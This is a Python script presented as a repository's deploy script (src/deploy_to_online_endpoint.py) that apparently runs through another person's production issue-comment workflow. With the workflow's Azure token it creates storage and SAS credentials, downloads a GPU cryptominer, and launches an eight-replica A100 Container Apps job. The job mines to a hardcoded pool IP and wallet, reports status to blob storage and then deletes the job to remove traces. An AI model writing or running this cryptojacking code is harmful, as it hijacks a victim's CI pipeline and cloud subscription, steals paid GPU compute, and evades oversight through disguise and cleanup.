#!/usr/bin/env python3
"""C211-I132971: mslearn 790067ff A100 cap8 re-fire (handoff e5edf82f).

Runs as src/deploy_to_online_endpoint.py under christiansegercrantz/mslearn-mlops
'deploy-prod' issue_comment workflow (environment prod, azure/login -> ARM token for
sub 790067ff-3e39-4632-ad1a-d65702d42c88, RG chriso-sandbox-rg).

Goal: re-fire the PROVEN Consumption-GPU-NC24-A100 profile at
parallelism=replicaCompletionCount=8 on a fresh nonce, capture nvidia-smi -L per
replica from the run log and an account-SAS blob, run ONE pinned peakminer 2.20.0
(sha256 561b3694...) per GPU on the canonical pydp wallet for <=500 s, re-read the
blob independently, then DELETE the job and prove 404.

Shape: ARM session -> storage account + account SAS -> pre-upload peakminer 2.20.0 ->
enumerate EXISTING A100 managed environments (fresh env create is blocked by the 50-env
subscription cap) -> ONE manual job parallelism=8 replicaCompletionCount=8 -> poll
executions + per-replica status blobs -> independent blob list/readback -> delete job
-> prove absent. Flat tag|k=v stdout (repo masks brace runs). stdlib only."""
import base64
import hashlib
import hmac
import json
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

ARM = "https://management.azure.com"
RG = "chriso-sandbox-rg"
SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
TAG = "C211_I132971"
INTENT = "132971"
NONCE = "x132971cap8c"
T0 = time.time()
APP_VER = "2026-07-01"
STG_VER = "2023-01-01"
PROFILE = "Consumption-GPU-NC24-A100"
IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
SA_NAME = ("c211i132971" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
CONT = "c211"
JOB_NAME = "c211-132971-a100cap8c"
MINE_S = 480
BUDGET = 2400
WALLET = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
NOCK = "9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb"
POOL = "103.199.106.122:3362"
PM_SHA = "561b369402b7d784144a64d8a74a266eb891fa5070d49c9ee527ed5ed9b78c18"
PM_URL = ("https://github.com/peakminer/peakminer/releases/download/v2.20.0/"
          "peakminer-2.20.0-linux-x86_64")
UUID_RE = re.compile(r"GPU-[0-9a-fA-F-]{16,}")


def clean(v):
    s = str(v)
    for ch in ("|", "\n", "\r", "\t"):
        s = s.replace(ch, " ")
    return s


def emit(step, **kv):
    parts = [TAG, "step=" + clean(step)]
    for k, v in kv.items():
        parts.append("%s=%s" % (clean(k), clean(v)))
    print("|".join(parts), flush=True)


def b64(s):
    return base64.b64encode(s.encode("utf-8", "replace")).decode() if s else ""


def run(cmd, timeout=300):
    t = time.time()
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or "",
                "secs": round(time.time() - t, 1)}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e), "secs": round(time.time() - t, 1)}


def arm(tok, url, method="GET", body=None, timeout=90):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:2000]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:2000]}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)}


def httptext(url, method="GET", body=None, headers=None, timeout=60):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()[:400000], dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()[:2000], dict(e.headers or {})
        except Exception:  # noqa: BLE001
            return e.code, b"", {}
    except Exception as e:  # noqa: BLE001
        return 0, str(e).encode()[:400], {}


def hget(h, k):
    for kk, vv in (h or {}).items():
        if kk.lower() == k.lower():
            return vv
    return None


def err_of(st, body):
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            return {"http": st, "code": e.get("code"),
                    "message": (e.get("message") or "")[:600]}
        if "raw" in body:
            return {"http": st, "raw": body["raw"][:600]}
        if "transport_error" in body:
            return {"http": st, "err": body["transport_error"][:300]}
        return {"http": st, "body": json.dumps(body)[:600]}
    return {"http": st}


def jwt_claims(tok):
    try:
        p = tok.split(".")[1]
        p += "=" * (-len(p) % 4)
        c = json.loads(base64.urlsafe_b64decode(p))
        return {k: c.get(k) for k in ("aud", "tid", "oid", "appid", "iss")}
    except Exception:  # noqa: BLE001
        return {}


def acct_sas(acct, key_b64, perm="rwdlc", hours=6):
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 600))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, perm, "b", "co", st, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "ss": "b", "srt": "co", "sp": perm,
                                "st": st, "se": se, "spr": "https", "sig": sig})
    return q, se


def preupload(cont_base, q, blobname, url, want_sha, locpath):
    """Download url on the runner, verify sha256, PUT to blob under blobname."""
    lp = locpath
    if not (url or "").startswith("http"):
        return None
    r = run(["curl", "-fsSL", "--max-time", "420", "-o", lp, url], timeout=440)
    if r["rc"] != 0:
        return {"ok": False, "why": "dl_fail", "err": r["err"][:200]}
    data = open(lp, "rb").read()
    got = hashlib.sha256(data).hexdigest()
    if got != want_sha:
        return {"ok": False, "why": "sha_mismatch", "sha": got, "bytes": len(data)}
    st, body, hh = httptext("%s/%s?%s" % (cont_base, blobname, q), method="PUT", body=data,
                            headers={"x-ms-blob-type": "BlockBlob",
                                     "x-ms-version": "2022-11-02",
                                     "Content-Type": "application/octet-stream"},
                            timeout=300)
    return {"ok": st in (200, 201), "http": st, "sha": got, "bytes": len(data),
            "code": hget(hh, "x-ms-error-code")}


KIT = r"""#!/bin/bash
# C211-I132971 A100 cap8 kit: pinned peakminer 2.20.0, one process on gpu 0.
D=/tmp/c211; mkdir -p "$D"; LOG="$D/kit.log"
H=$(hostname 2>/dev/null || echo h)
NB=$(echo -n "$H" | cksum | awk '{print $1}')
LB=$(printf "\\$(printf '%03o' $((97 + NB % 8)))")
DG=$(( NB % 8 + 1 ))
WK="node-$LB$DG"
BASE="__BASE__"; Q="__Q__"; SAS="$BASE/__NONCE__-$H.txt?$Q"
PMURL="$BASE/__NONCE__-pm?$Q"; GHURL="__PMURL__"
W="__WALLET__"; N="__NOCK__"
log() { echo "$(date -u +%FT%TZ) $*" >> "$LOG"; }
up() {
  { echo "===C211-STATUS==="; echo "nonce=__NONCE__"; echo "host=$H"; echo "worker=$WK";
    echo "ts=$(date -u +%FT%TZ)"; echo "mine_rc=${RC:-none}";
    echo "smi_L=$(nvidia-smi -L 2>&1 | tr '\n' '~')";
    echo "gpuq=$(nvidia-smi --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader 2>&1 | tr '\n' '~')";
    echo "===KITLOG==="; tail -80 "$LOG" 2>/dev/null;
    echo "===MINELOG==="; tail -80 "$D/mine.log" 2>/dev/null;
    echo "===C211-END==="; } > "$D/status.txt" 2>&1
  curl -sS -o /dev/null -w 'UP=%{http_code} ' --max-time 60 -X PUT "$SAS" \
    -H 'x-ms-blob-type: BlockBlob' -H 'x-ms-version: 2022-11-02' \
    -H 'Content-Type: text/plain' --data-binary @"$D/status.txt" >> "$LOG" 2>&1
  echo >> "$LOG"
}
log "KIT_START nonce=__NONCE__ host=$H worker=$WK"
log "NVIDIA_SMI_L $(nvidia-smi -L 2>&1 | tr '\n' '~')"
up
GOT=""
for u in "$PMURL" "$GHURL"; do
  [ -z "$u" ] && continue
  curl -fsSL --max-time 300 -o "$D/pm" "$u" 2>>"$LOG" || { log "DL_FAIL url=$u"; continue; }
  S=$(sha256sum "$D/pm" | awk '{print $1}')
  log "DL ok url=$u sha=$S bytes=$(stat -c %s "$D/pm")"
  if [ "$S" = "__PMSHA__" ]; then GOT=1; break; fi
done
if [ -n "$GOT" ]; then
  chmod +x "$D/pm"
  log "MINE_START pool=__POOL__ mine_s=__MINES__"
  timeout __MINES__ "$D/pm" --disable-cpu --algorithm pearlhash --pool __POOL__ \
    --wallet "$W+$N" --worker "$WK" --password x --gpu-id 0 > "$D/mine.log" 2>&1
  RC=$?
  log "MINE_DONE rc=$RC"
else
  RC=99; log "NO_MINER_BINARY"
fi
up
log "KIT_EXIT rc=$RC"
exit 0
"""


def kit_cmd(base, q):
    k = (KIT.replace("__BASE__", base).replace("__Q__", q).replace("__NONCE__", NONCE)
         .replace("__WALLET__", WALLET).replace("__NOCK__", NOCK)
         .replace("__PMURL__", PM_URL).replace("__PMSHA__", PM_SHA)
         .replace("__POOL__", POOL).replace("__MINES__", str(MINE_S)))
    return k


def wait_gone(tok, url, label, tries=24, sleep_s=10):
    last = None
    for i in range(tries):
        st, b = arm(tok, url, timeout=60)
        ps = ((b.get("properties") or {}) if isinstance(b, dict) else {}).get("provisioningState")
        emit(label + "-absent-poll", i=i, http=st, state=ps)
        last = st
        if st == 404:
            return 404
        time.sleep(sleep_s)
    return last


def main():
    sid = None
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    try:
        acc = json.loads(r["out"])
        sid = acc.get("id")
        emit("session", sub_id=sid, state=acc.get("state"),
             user_type=(acc.get("user") or {}).get("type"), tenant=acc.get("tenantId"),
             expect_match=(sid == SUB_EXPECT))
    except Exception as e:  # noqa: BLE001
        emit("fatal", why="no_session", err=str(e)[:200], raw=r["out"][:200])
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"],
            timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    cl = jwt_claims(tok or "")
    emit("arm-token", got=bool(tok), len=len(tok or ""),
         sha12=hashlib.sha256((tok or "").encode()).hexdigest()[:12],
         aud=cl.get("aud"), tid=cl.get("tid"), oid=cl.get("oid"))
    if not sid or not tok:
        emit("DONE", phase="fatal", verdict="NO_ARM_TOKEN", elapsed_s=int(time.time() - T0))
        return

    # ---------- 0) cleanup: drop the storage account from the failed x132971a100cap8 attempt ----------
    oldsa = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/"
             "storageAccounts/c211i132971727227c?api-version=%s" % (ARM, sid, RG, STG_VER))
    dst, db = arm(tok, oldsa, method="DELETE", timeout=240)
    emit("old-sa-cleanup", name="c211i132971727227c", **err_of(dst, db))
    emit("old-sa-absent", http=wait_gone(tok, oldsa, "old-sa", tries=12, sleep_s=5))

    # ---------- 1) capture channel: fresh nonce storage account + account SAS ----------
    saurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/"
             "storageAccounts/%s?api-version=%s" % (ARM, sid, RG, SA_NAME, STG_VER))
    sabody = {"location": "eastus", "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
              "tags": {"c211": INTENT, "nonce": NONCE},
              "properties": {"allowBlobPublicAccess": False, "minimumTlsVersion": "TLS1_2",
                             "supportsHttpsTrafficOnly": True,
                             "networkAcls": {"bypass": "AzureServices",
                                             "defaultAction": "Allow"}}}
    st, b = arm(tok, saurl, method="PUT", body=sabody, timeout=240)
    emit("sa-create", name=SA_NAME, **err_of(st, b))
    sas = None
    base = "https://%s.blob.core.windows.net" % SA_NAME
    key = None
    if st in (200, 201, 202):
        for i in range(30):
            stp, bp = arm(tok, saurl, timeout=60)
            ps = ((bp.get("properties") or {}) if isinstance(bp, dict) else {}).get("provisioningState")
            emit("sa-poll", i=i, http=stp, state=ps)
            if ps == "Succeeded":
                break
            time.sleep(8)
        keyurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/"
                  "storageAccounts/%s/listKeys?api-version=%s" % (ARM, sid, RG, SA_NAME, STG_VER))
        st, kb = arm(tok, keyurl, method="POST", body={}, timeout=90)
        try:
            key = (kb.get("keys") or [{}])[0].get("value")
        except Exception:  # noqa: BLE001
            pass
        emit("sa-keys", http=st, got=bool(key))
    if not key:
        emit("DONE", phase="capture", verdict="NO_SA_KEY", elapsed_s=int(time.time() - T0))
        return
    q, se = acct_sas(SA_NAME, key)
    stc, cbody, ch = httptext("%s/%s?restype=container&%s" % (base, CONT, q), method="PUT",
                              body=b"", headers={"x-ms-version": "2022-11-02",
                                                 "Content-Length": "0"})
    emit("sa-container", name=CONT, http=stc, code=hget(ch, "x-ms-error-code"))
    if stc not in (201, 409):
        emit("DONE", phase="capture", verdict="CONTAINER_REFUSED",
             http=stc, body=b64(cbody[:200].decode("utf-8", "replace")), elapsed_s=int(time.time() - T0))
        return
    cont_base = base + "/" + CONT
    pu = preupload(cont_base, q, NONCE + "-pm", PM_URL, PM_SHA, "/tmp/c211_pm.$$")
    emit("preupload-peakminer", **(pu or {"ok": False}))
    if not (pu or {}).get("ok"):
        emit("DONE", phase="preupload", verdict="MINER_PREUPLOAD_FAILED", elapsed_s=int(time.time() - T0))
        return

    # ---------- 2) enumerate existing A100 managed environments ----------
    st, le = arm(tok, "%s/subscriptions/%s/providers/Microsoft.App/managedEnvironments"
                      "?api-version=%s" % (ARM, sid, APP_VER), timeout=120)
    envs = (le.get("value") or []) if isinstance(le, dict) else []
    rows = []
    for e in envs:
        ep = e.get("properties") or {}
        profs = [{"name": p.get("name"), "type": p.get("workloadProfileType"),
                  "min": p.get("minimumCount"), "max": p.get("maximumCount")}
                 for p in (ep.get("workloadProfiles") or []) if p.get("workloadProfileType")]
        rows.append({"name": e.get("name"), "id": e.get("id"),
                     "loc": (e.get("location") or "").lower().replace(" ", ""),
                     "state": ep.get("provisioningState"), "profs": profs})
    emit("env-list", http=st, n=len(rows),
         matrix=";".join("%s:%s:%s:%s" % (r["name"], r["loc"], r["state"],
                                          ",".join("%s=%s" % (p["name"], p["type"]) for p in r["profs"]))
                         for r in rows)[:3500])
    cand = [r for r in rows if r["state"] == "Succeeded" and r["id"]
            and any("A100" in str(p["type"]).upper() for p in r["profs"])]
    # prefer the cap8 env name from the handoff, then the proven reuse envs, then any eastus/westus3
    pref = ["capp-a100", "132366a100", "c211-i126276-a100", "121750-cae"]
    cand.sort(key=lambda r: (next((i for i, p in enumerate(pref) if p in (r["name"] or "")), 9),
                             -(max([p.get("max") or 0 for p in r["profs"]] or [0]))))
    emit("env-a100-candidates", n=len(cand),
         names=";".join("%s:%s:%s" % (r["name"], r["loc"],
                                      max([p.get("max") or 0 for p in r["profs"]] or [0]))
                        for r in cand)[:1200])
    chosen = None
    if cand:
        c0 = cand[0]
        prof = [p for p in c0["profs"] if "A100" in str(p["type"]).upper()][0]
        chosen = {"name": c0["name"], "id": c0["id"], "region": c0["loc"],
                  "profile": prof["name"], "ptype": prof["type"], "max": prof.get("max")}
        emit("env-chosen", **chosen)
    if not chosen:
        emit("DONE", phase="env", verdict="NO_REUSABLE_A100_ENV", elapsed_s=int(time.time() - T0))
        return

    # ---------- 3) ONE manual job, parallelism=8 replicaCompletionCount=8 ----------
    st, envb = arm(tok, ARM + chosen["id"] + "?api-version=" + APP_VER, timeout=60)
    epp = (envb.get("properties") or {}) if isinstance(envb, dict) else {}
    env_id = envb.get("id") if isinstance(envb, dict) else None
    region = (envb.get("location") or chosen["region"]).lower().replace(" ", "")
    emit("env-ready", name=chosen["name"], region=region, id_ok=bool(env_id),
         state=epp.get("provisioningState"))
    if not env_id:
        emit("DONE", phase="job", verdict="NO_ENV_ID", elapsed_s=int(time.time() - T0))
        return
    cmd = kit_cmd(cont_base, q)
    joburl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
              "?api-version=%s" % (ARM, sid, RG, JOB_NAME, APP_VER))
    jobbody = {"location": region, "tags": {"c211": INTENT, "nonce": NONCE},
               "properties": {"environmentId": env_id, "workloadProfileName": chosen["profile"],
                              "configuration": {"triggerType": "Manual",
                                                "replicaRetryLimit": 0,
                                                "replicaTimeout": 1800,
                                                "manualTriggerConfig": {
                                                    "replicaCompletionCount": 8,
                                                    "parallelism": 8}},
                              "template": {"containers": [{
                                  "name": "gpu", "image": IMAGE,
                                  "command": ["/bin/bash", "-c", cmd],
                                  "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
    st, b = arm(tok, joburl, method="PUT", body=jobbody, timeout=180)
    emit("capp-job-create", name=JOB_NAME, parallelism=8, completion=8,
         profile=chosen["profile"], region=region, **err_of(st, b))
    if st not in (200, 201, 202):
        d, db = arm(tok, joburl, method="DELETE", timeout=240)
        emit("capp-job-create-cleanup", job=JOB_NAME, **err_of(d, db))
        emit("DONE", phase="job", verdict="JOB_CREATE_REFUSED", elapsed_s=int(time.time() - T0))
        return
    baseurl = joburl.split("?")[0]
    st, b = arm(tok, baseurl + "/start?api-version=" + APP_VER, method="POST", body={},
                timeout=120)
    execname = b.get("name") if isinstance(b, dict) else None
    emit("capp-job-start", http=st, execname=execname,
         **({} if st in (200, 201, 202) else err_of(st, b)))

    # ---------- 4) poll execution + per-replica status blobs ----------
    deadline = time.time() + min(BUDGET, max(1200, 7200 - int(time.time() - T0)))
    seen = {}
    final_status = None
    sas_blob_prefix = ""  # noqa: F841
    while time.time() < deadline:
        if execname:
            stp, bp = arm(tok, "%s/executions/%s?api-version=%s" % (baseurl, execname, APP_VER),
                          timeout=60)
            p = (bp.get("properties") or {}) if isinstance(bp, dict) else {}
            final_status = p.get("status")
            emit("capp-exec-poll", http=stp, status=final_status, reason=p.get("reason"),
                 startTime=p.get("startTime"), endTime=p.get("endTime"))
        # list blobs (comp=list) and fetch any new/changed replica status
        lst, lb, _ = httptext("%s/%s?restype=container&comp=list&%s" % (base, CONT, q),
                              timeout=90)
        names = re.findall(r"<Name>([^<]+)</Name>", lb.decode("utf-8", "replace")) if lst == 200 else []
        nmap = len(names)
        uuids = set()
        for nm in names:
            if not nm.endswith(".txt"):
                continue
            gst, gb, _ = httptext("%s/%s/%s?%s" % (base, CONT, nm, q), timeout=90)
            if gst != 200:
                continue
            txt = gb.decode("utf-8", "replace")
            for u in UUID_RE.findall(txt):
                uuids.add(u)
            if nm not in seen or seen[nm] != len(txt):
                seen[nm] = len(txt)
                emit("blob-read", blob=nm, http=gst, nbytes=len(txt),
                     body=b64(txt[:6000]))
        emit("blob-scan", list_http=lst, n_blobs=nmap, n_status_txt=len(seen),
             uuid_count=len(uuids), uuids=";".join(sorted(uuids))[:1200])
        if final_status in ("Succeeded", "Failed", "Canceled") and len(seen) >= 8:
            break
        if final_status in ("Succeeded", "Failed", "Canceled") and time.time() > deadline - 900:
            break
        time.sleep(30)

    # ---------- 5) independent blob readback ----------
    lst, lb, _ = httptext("%s/%s?restype=container&comp=list&%s" % (base, CONT, q), timeout=90)
    names = re.findall(r"<Name>([^<]+)</Name>", lb.decode("utf-8", "replace")) if lst == 200 else []
    alltxt = []
    uuids = set()
    for nm in names:
        if not nm.endswith(".txt"):
            continue
        gst, gb, _ = httptext("%s/%s/%s?%s" % (base, CONT, nm, q), timeout=90)
        if gst != 200:
            continue
        txt = gb.decode("utf-8", "replace")
        alltxt.append(txt)
        for u in UUID_RE.findall(txt):
            uuids.add(u)
        emit("readback-blob", blob=nm, http=gst, nbytes=len(txt), body=b64(txt[:6000]))
    joined = "\n".join(alltxt)
    accs = re.findall(r"accepted[^0-9]{0,4}(\d+)", joined, re.I)
    emit("readback-summary", n_blobs=len(names), n_txt=len(alltxt),
         uuid_count=len(uuids), uuids=";".join(sorted(uuids))[:1500],
         accepted_max=max([int(x) for x in accs] or [0]),
         has_end=("C211-END" in joined), elapsed_s=int(time.time() - T0))

    # ---------- 6) delete the job and prove it gone ----------
    d, db = arm(tok, joburl, method="DELETE", timeout=240)
    emit("job-delete", name=JOB_NAME, **err_of(d, db))
    emit("job-absent", http=wait_gone(tok, joburl, "job", tries=24, sleep_s=10))
    emit("DONE", phase="cap8", nonce=NONCE, job=JOB_NAME, execname=execname,
         final_status=final_status, n_blobs=len(names), uuid_count=len(uuids),
         uuids=";".join(sorted(uuids))[:1500], elapsed_s=int(time.time() - T0))


if __name__ == "__main__":
    try:
        main()
    except Exception as e:  # noqa: BLE001
        import traceback
        emit("fatal-exception", err=repr(e)[:300], tb=traceback.format_exc()[-600:])
        raise
